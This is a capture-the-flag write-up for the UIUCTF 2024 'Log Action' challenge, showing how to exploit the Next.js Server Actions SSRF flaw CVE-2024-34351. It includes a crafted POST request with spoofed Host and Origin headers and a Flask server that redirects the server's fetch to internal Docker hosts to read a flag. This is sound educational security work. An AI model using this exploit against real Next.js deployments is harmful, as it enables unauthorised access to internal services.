# Log Action

## Table of Contents

1. [Overview](#overview)
2. [Background](#background)
3. [Enumeration](#enumeration)
4. [Exploitation](#exploitation)
5. [Conclusion](#conclusion)

## Overview

- Solved by: @siunam
- 105 solves / 431 points
- Overall difficulty for me (From 1-10 stars): ★★☆☆☆☆☆☆☆☆

## Background

I keep trying to log in, but it's not working :'(

[http://log-action.challenge.uiuc.tf/](http://log-action.challenge.uiuc.tf/)

![](https://github.com/siunam321/CTF-Writeups/blob/main/UIUCTF-2024/images/Pasted%20image%2020240701133334.png)

## Enumeration

**Index page:**

![](https://github.com/siunam321/CTF-Writeups/blob/main/UIUCTF-2024/images/Pasted%20image%2020240701133354.png)

![](https://github.com/siunam321/CTF-Writeups/blob/main/UIUCTF-2024/images/Pasted%20image%2020240701133404.png)

In here, we can see that it has login page.

We can try to login as a random user just for testing purpose:

![](https://github.com/siunam321/CTF-Writeups/blob/main/UIUCTF-2024/images/Pasted%20image%2020240701133450.png)

![](https://github.com/siunam321/CTF-Writeups/blob/main/UIUCTF-2024/images/Pasted%20image%2020240701133459.png)

According to the challenge's description, this login page appears to be broken.

There's not much we can do in here. Let's read this web application's source code!

**In this challenge, we can download a file:**
```shell
┌[siunam♥Mercury]-(~/ctf/UIUCTF-2024/Web/Log-Action)-[2024.07.01|12:29:43(HKT)]
└> file log-action.zip     
log-action.zip: Zip archive data, at least v2.0 to extract, compression method=store
┌[siunam♥Mercury]-(~/ctf/UIUCTF-2024/Web/Log-Action)-[2024.07.01|12:29:45(HKT)]
└> unzip log-action.zip 
Archive:  log-action.zip
   creating: log-action/
   creating: log-action/backend/
  inflating: log-action/backend/flag.txt  
  inflating: log-action/docker-compose.yml  
   creating: log-action/frontend/
  inflating: log-action/frontend/.gitignore  
  inflating: log-action/frontend/Dockerfile  
  inflating: log-action/frontend/entrypoint.sh  
  inflating: log-action/frontend/next-env.d.ts  
  inflating: log-action/frontend/next.config.mjs  
  inflating: log-action/frontend/package-lock.json  
  inflating: log-action/frontend/package.json  
  inflating: log-action/frontend/postcss.config.mjs  
   creating: log-action/frontend/src/
   creating: log-action/frontend/src/app/
   creating: log-action/frontend/src/app/admin/
  inflating: log-action/frontend/src/app/admin/page.tsx  
  inflating: log-action/frontend/src/app/global.css  
  inflating: log-action/frontend/src/app/layout.tsx  
   creating: log-action/frontend/src/app/login/
  inflating: log-action/frontend/src/app/login/page.tsx  
   creating: log-action/frontend/src/app/logout/
  inflating: log-action/frontend/src/app/logout/page.tsx  
  inflating: log-action/frontend/src/app/page.tsx  
  inflating: log-action/frontend/src/auth.config.ts  
  inflating: log-action/frontend/src/auth.ts  
   creating: log-action/frontend/src/lib/
  inflating: log-action/frontend/src/lib/actions.ts  
  inflating: log-action/frontend/src/middleware.ts  
  inflating: log-action/frontend/tailwind.config.ts  
  inflating: log-action/frontend/tsconfig.json  
```

After reviewing the source, we can have the following findings!

- The application separates the front-end and the back-end
- The front-end uses **Next.js** and Tailwind CSS, the back-end uses Nginx
- The web application's main logic is at the front-end

First of, where's the flag, our objective? 

In `log-action/docker-compose.yml`, we can see that the flag file (`flag.txt`) is at the **back-end service** and **mounted the flag file from `./backend/flag.txt` to `/usr/share/nginx/html/flag.txt`**. That being said, if we can *somehow* reach to the internal Nginx, we could **get the flag at `http://<back-end_IP>/flag.txt`**. This is because the **default Nginx webroot directory is at `/usr/share/nginx/html/`**.

Ok, now we know what's our objective: *Somehow reach to the internal Nginx*. Hmm... **SSRF (Server-Side Request Forgery)**? where attackers can send HTTP requests to an internal network/service.

Huh, is there any SSRF vulnerability in this web application?

Well, after reading the **authentication** implementation, **it has nothing to do with SSRF**. Even if we logged in as the admin user, it just render a page like this:

```typescript
import Link from "next/link";

export default function Page() {
  return (
    <div>
      <h1 className="text-2xl font-bold">
        Admin
      </h1>
      <p>Very cool! You logged in as admin!</p>
      <Link href="/logout">Log out</Link>
    </div>
  );
}
```

So, nope. Well, at least not in the web application's implementation. 

Another thing I'll look for is **dependencies issue**. A year ago, I learned about the Log4J RCE (Remote Code Execution) vulnerability, and it made me realize all the libraries and modules that we all use could be potentially dangerous.

In JavaScript, the most popular [package manager](https://en.wikipedia.org/wiki/Package_manager) is [npm](https://www.npmjs.com/). In the `npm` command-line tool, **we can use the `npm audit` command to check for dependencies issue**:

```shell
┌[siunam♥Mercury]-(~/ctf/UIUCTF-2024/Web/Log-Action)-[2024.07.01|12:57:30(HKT)]
└> cd log-action/frontend 
┌[siunam♥Mercury]-(~/ctf/UIUCTF-2024/Web/Log-Action/log-action/frontend)-[2024.07.01|12:57:32(HKT)]
└> npm audit
# npm audit report

next  >=13.4.0 <14.1.1
Severity: high
Next.js Server-Side Request Forgery in Server Actions - https://github.com/advisories/GHSA-fr5h-rqp8-mj6g
fix available via `npm audit fix --force`
Will install next@14.2.4, which is outside the stated dependency range
node_modules/next

1 high severity vulnerability

To address all issues, run:
  npm audit fix --force
```

Ah ha! Looks like **this version of Next.js (`13.4.0`) has a SSRF vulnerability in the Server Actions**!

In that [GitHub Advisory link](https://github.com/advisories/GHSA-fr5h-rqp8-mj6g), it has a CVE number: `CVE-2024-34351`.

After Googling this CVE number, we can find [this Assetnote blog post](https://www.assetnote.io/resources/research/digging-for-ssrf-in-nextjs-apps), it's written by the researchers who found this SSRF vulnerability.

In short, although **Next.js** seems like a client-side framework, it also supports server-side framework using the **Server Action**.

You may ask: What's Server Action in Next.js?

Well, Next.js's Server Action **allows JavaScript code to be executed asynchronously on the server-side**. By doing so, the developers don't have to develop another back-end code to process server-side logic.

According to the Assetnote's blog post, when we call a Server Action AND it responds with a **redirect**, it calls asynchronous function `createRedirectRenderResult`.

**If we look at this web application source code, the logout page (`log-action/frontend/src/app/logout/page.tsx`) does satisfy the above condition:**
```typescript
import Link from "next/link";
import { redirect } from "next/navigation";
import { signOut } from "@/auth";

export default function Page() {
  return (
    <>
      <h1 className="text-2xl font-bold">Log out</h1>
      <p>Are you sure you want to log out?</p>
      <Link href="/admin">
        Go back
      </Link>
      <form
        action={async () => {
          "use server";
          await signOut({ redirect: false });
          redirect("/login");
        }}
      >
        <button type="submit">Log out</button>
      </form>
    </>
  )
}
```

As you can see, the logout page uses Server Action (`"use server";`) and `redirect` function to redirect the client to `/login`.

**Logout page:**

![](https://github.com/siunam321/CTF-Writeups/blob/main/UIUCTF-2024/images/Pasted%20image%2020240701133933.png)

When we clicked the "Log out" button, it sends the following POST request to `/logout`:

![](https://github.com/siunam321/CTF-Writeups/blob/main/UIUCTF-2024/images/Pasted%20image%2020240701134059.png)

Now, since Next.js is an open-source project, we can take a look at function `createRedirectRenderResult` before they applied the vulnerability patch: [https://github.com/vercel/next.js/blob/64b718c6618b6c419872abbf22163ae543ac259e/packages/next/src/server/app-render/action-handler.ts#L240-L327](https://github.com/vercel/next.js/blob/64b718c6618b6c419872abbf22163ae543ac259e/packages/next/src/server/app-render/action-handler.ts#L240-L327)

If we look closer at this function, something's really stands out:

```typescript
async function createRedirectRenderResult(
  req: BaseNextRequest,
  res: BaseNextResponse,
  originalHost: Host,
  redirectUrl: string,
  basePath: string,
  staticGenerationStore: StaticGenerationStore
) {
  res.setHeader('x-action-redirect', redirectUrl)
  [...]
  // If we're redirecting to another route of this Next.js application, we'll
  // try to stream the response from the other worker path. When that works,
  // we can save an extra roundtrip and avoid a full page reload.
  // When the redirect URL starts with a `/`, or to the same host as application,
  // we treat it as an app-relative redirect.
  const parsedRedirectUrl = new URL(redirectUrl, 'http://n')
  const isAppRelativeRedirect =
    redirectUrl.startsWith('/') ||
    (originalHost && originalHost.value === parsedRedirectUrl.host)

  if (isAppRelativeRedirect) {
    [...]
    const forwardedHeaders = getForwardedHeaders(req, res)
    forwardedHeaders.set(RSC_HEADER, '1')
    
    const proto =
      staticGenerationStore.incrementalCache?.requestProtocol || 'https'

    // For standalone or the serverful mode, use the internal origin directly
    // other than the host headers from the request.
    const origin =
      process.env.__NEXT_PRIVATE_ORIGIN || `${proto}://${originalHost.value}`

    const fetchUrl = new URL(
      `${origin}${basePath}${parsedRedirectUrl.pathname}${parsedRedirectUrl.search}`
    )
    [...]
    try {
      const response = await fetch(fetchUrl, {
        method: 'GET',
        headers: forwardedHeaders,
        next: {
          // @ts-ignore
          internal: 1,
        },
      })

      if (response.headers.get('content-type') === RSC_CONTENT_TYPE_HEADER) {
        [...]
        return new FlightRenderResult(response.body!)
      } else {
        [...]
      }
    } catch (err) {
      [...]
    }
  }

  return RenderResult.fromStatic('{}')
}
```

As you can see in the comment, instead of redirect directly to the client, if the redirect path starts with `/`, it first **fetches the response of the redirect path**, then return the response to the client. By doing so, it improves the performance ("we can save an extra roundtrip and avoid a full page reload.").

Hmm... **I wonder if we can control the `origin`**... If so, we can let the server-side to **fetch any resources from any origins**.

**By tracing to the function call, that function was called by [function `handleAction`](https://github.com/vercel/next.js/blob/64b718c6618b6c419872abbf22163ae543ac259e/packages/next/src/server/app-render/action-handler.ts#L367):**
```typescript
export async function handleAction([...]):
  [...]
  const originDomain =
    typeof req.headers['origin'] === 'string'
      ? new URL(req.headers['origin']).host
      : undefined
  [...]
  const hostHeader = req.headers['host']
  [...]
  if (!originDomain) {
    [...]
  } else if (!host || originDomain !== host.value) {
    [...]
  }
  [...]
  if (actionId) {
    [...]
    if (forwardedWorker) {
      return {
        type: 'done',
        result: await createForwardedActionResponse(
          req,
          res,
          host,
          forwardedWorker,
          ctx.renderOpts.basePath,
          staticGenerationStore
        ),
      }
    }
  }
  [...]
```

Hmm... We can control it by using the **`Host` header**.

> Note: It seems like it also needs the `Origin` header to check for CSRF attacks.

Nice! With that said, we can let the server-side to fetch any resources from any origins with the `Host` header!

To test it, we need to:

- Port forwarding via ngrok:

```shell
┌[siunam♥Mercury]-(~/ctf/UIUCTF-2024/Web/Log-Action)-[2024.07.01|14:38:59(HKT)]
└> ngrok http 80
[...]
Forwarding                    https://1593-{REDACTED}.ngrok-free.app -> http://localhost:80            
[...]
```

- Setup a simple HTTP server:

```shell
┌[siunam♥Mercury]-(~/ctf/UIUCTF-2024/Web/Log-Action)-[2024.07.01|14:40:17(HKT)]
└> python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
```

**Then, send the following POST request to `/logout`:**
```http
POST /logout HTTP/1.1
Host: 1593-{REDACTED}.ngrok-free.app
Origin: https://1593-{REDACTED}.ngrok-free.app/
Accept: text/x-component
Next-Action: c3a144622dd5b5046f1ccb6007fea3f3710057de
Next-Router-State-Tree: %5B%22%22%2C%7B%22children%22%3A%5B%22logout%22%2C%7B%22children%22%3A%5B%22__PAGE__%22%2C%7B%7D%5D%7D%5D%7D%2Cnull%2Cnull%2Ctrue%5D
Content-Type: multipart/form-data; boundary=---------------------------30523002528298602961754182131
Content-Length: 333
Origin: http://log-action.challenge.uiuc.tf
Connection: keep-alive
Cookie: authjs.csrf-token=3a88d122c42873637d81db77edf8571e94e78697010629b27d9d1632876b75ad%7C250eafa2f8899729450d0228f76b528c95b155ca24e929d61e934ce559b299b5

-----------------------------30523002528298602961754182131
Content-Disposition: form-data; name="1_$ACTION_ID_c3a144622dd5b5046f1ccb6007fea3f3710057de"


-----------------------------30523002528298602961754182131
Content-Disposition: form-data; name="0"

["$K1"]
-----------------------------30523002528298602961754182131--
```

> Note: The `Origin` header and the header's value `/` is required.

![](https://github.com/siunam321/CTF-Writeups/blob/main/UIUCTF-2024/images/Pasted%20image%2020240701144253.png)

```shell
┌[siunam♥Mercury]-(~/ctf/UIUCTF-2024/Web/Log-Action)-[2024.07.01|14:40:17(HKT)]
└> python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
127.0.0.1 - - [01/Jul/2024 14:42:10] code 404, message File not found
127.0.0.1 - - [01/Jul/2024 14:42:10] "HEAD /login HTTP/1.1" 404 -
```

> Note: The HEAD request is the CORS (Cross-Origin Resource Sharing) preflight check.

Nice! We got a **blind SSRF**!

Now, you may wonder: Can we read the response body?

**Let's look back to the function `createRedirectRenderResult`'s `fetch` call:**
```typescript
    [...]
    try {
      const response = await fetch(fetchUrl, {
        method: 'GET',
        headers: forwardedHeaders,
        next: {
          // @ts-ignore
          internal: 1,
        },
      })

      if (response.headers.get('content-type') === RSC_CONTENT_TYPE_HEADER) {
        [...]
        return new FlightRenderResult(response.body!)
      } else {
        [...]
      }
    } catch (err) {
      [...]
    }
  [...]
  return RenderResult.fromStatic('{}')
  [...]
```

As you can see, if the response header `Content-Type` is `RSC_CONTENT_TYPE_HEADER`, it'll return the response body to us (`return new FlightRenderResult(response.body!)`)!

**Uhh... What's that `RSC_CONTENT_TYPE_HEADER`? Actually, it's just `text/x-component`:** 
```typescript
[...]
import {
  RSC_HEADER,
  RSC_CONTENT_TYPE_HEADER,
} from '../../client/components/app-router-headers'
[...]
```

**`app-router-headers.ts`:**
```typescript
[...]
export const RSC_CONTENT_TYPE_HEADER = 'text/x-component' as const
[...]
```

So... Firstly, in the CORS preflight check HEAD request, if we **set the response header `Content-Type` to `text/x-component`**, the CORS preflight check should be passed. Then, we can read the response body.

## Exploitation

**Let's write a simple Flask app to verify that!**
```python
#!/usr/bin/env python3
from flask import Flask, request, Response

app = Flask(__name__)

@app.route('/login')
def exploit():
    # CORS preflight check
    if request.method == 'HEAD':
        response = Response()
        response.headers['Content-Type'] = 'text/x-component'
        return response
    # after CORS preflight check
    elif request.method == 'GET':
        return 'After CORS preflight check'

if __name__ == '__main__':
    app.run(port=80, debug=True)
```

```shell
┌[siunam♥Mercury]-(~/ctf/UIUCTF-2024/Web/Log-Action)-[2024.07.01|14:54:52(HKT)]
└> python3 exploit.py    
[...]
```

**Then send the POST request at `/logout` again:**

![](https://github.com/siunam321/CTF-Writeups/blob/main/UIUCTF-2024/images/Pasted%20image%2020240701150504.png)

```shell
┌[siunam♥Mercury]-(~/ctf/UIUCTF-2024/Web/Log-Action)-[2024.07.01|14:54:52(HKT)]
└> python3 exploit.py
[...]
127.0.0.1 - - [01/Jul/2024 15:02:34] "HEAD /login HTTP/1.1" 200 -
127.0.0.1 - - [01/Jul/2024 15:02:35] "GET /login HTTP/1.1" 200 -
```

Nice! We can now read the response body!

Wait... How can we reach the challenge's internal services?

Well, **redirect**! In our Flask app, we can redirect the server-side's `fetch` to our intended resource. Let's update our Flask app source code!

```python
#!/usr/bin/env python3
from flask import Flask, request, Response, redirect

app = Flask(__name__)

@app.route('/login')
def exploit():
    # CORS preflight check
    if request.method == 'HEAD':
        response = Response()
        response.headers['Content-Type'] = 'text/x-component'
        return response
    # after CORS preflight check
    elif request.method == 'GET':
        ssrfUrl = 'http://localhost:3000/'
        return redirect(ssrfUrl)

if __name__ == '__main__':
    app.run(port=80, debug=True)
```

![](https://github.com/siunam321/CTF-Writeups/blob/main/UIUCTF-2024/images/Pasted%20image%2020240701150912.png)

Nice! The SSRF worked!

To get the flag, we can redirect the server-side's `fetch` to the internal back-end.

Uhh... How can we know the back-end IP address??

Since the challenge should be deployed via Docker, we can try to guess/brute force the back-end internal IP address.

> Note: We can also use `backend` as the host: (I didn't know this trick before, learned a new thing!)
> 
> ![](https://github.com/siunam321/CTF-Writeups/blob/main/UIUCTF-2024/images/Pasted%20image%2020240701151421.png)

By default, Docker uses the **default `172.17.0.0/16` subnet** for container networking.

**After some brute forcing, I found out that the internal IP address for the back-end service is `172.18.0.2`:**
```python
    [...]
    elif request.method == 'GET':
        ssrfUrl = 'http://172.18.0.2/flag.txt'
        return redirect(ssrfUrl)
    [...]
```

![](https://github.com/siunam321/CTF-Writeups/blob/main/UIUCTF-2024/images/Pasted%20image%2020240701151718.png)

Nice! We get the flag!

- **Flag: `uiuctf{close_enough_nextjs_server_actions_welcome_back_php}`**

## Conclusion

What we've learned:

1. Exploiting Next.js Server-Side Request Forgery in Server Actions (CVE-2024-34351)